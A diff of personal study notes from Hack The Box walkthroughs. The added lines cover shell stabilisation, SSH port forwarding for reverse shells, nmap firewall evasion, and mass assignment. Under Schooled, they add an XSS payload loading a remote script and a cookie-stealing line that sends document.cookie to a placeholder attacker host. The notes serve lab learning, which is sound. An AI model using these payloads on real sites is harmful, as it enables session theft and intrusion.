@@ -1,7 +1,7 @@
 Notes from IppSec's walkthroughs of the HTB machines I don't have access to :(
 
 Vault
-  - For a fully stable shell --> python -c 'import pty;pty.spawn("/bin/bash")' --> CTRL + Z --> ssty raw -echo --> fg --> export TERM=xterm
+  - For a fully stable shell --> python -c 'import pty;pty.spawn("/bin/bash")' --> CTRL + Z --> ssty raw -echo --> fg [enter] [enter]--> export TERM=xterm
   - You can remote port forward in order to recieve a shell on your machine that is only available internally (send reverse shell to ssh user, which forwards the connection to your attacker machine)
   - ssh -R 127.0.0.1:9001:127.0.0.1:9001
   - You can bypass firewalls with the flag --source-port x in nmap. For example, if the firewall is blocking everything except DNS (port 53), try nmap ...... --source-port 53
@@ -45,7 +45,9 @@ Mango
   - Another great Python script demonstration for NoSQL injecton exploitation
 
 Schooled
-  - a
+  - Awesome XSS exploitation! <script src="http://my_ip/malicious.js"></script> and fill malicious.js with a cookie stealing script
+  - document.write('<img src="http://my_ip/?' + document.cookie + '">');
+  - Mass assignment vulnerability --> When you can add/edit parameters which are not shown in the UI by tampering the request
 
 Sink
   - a
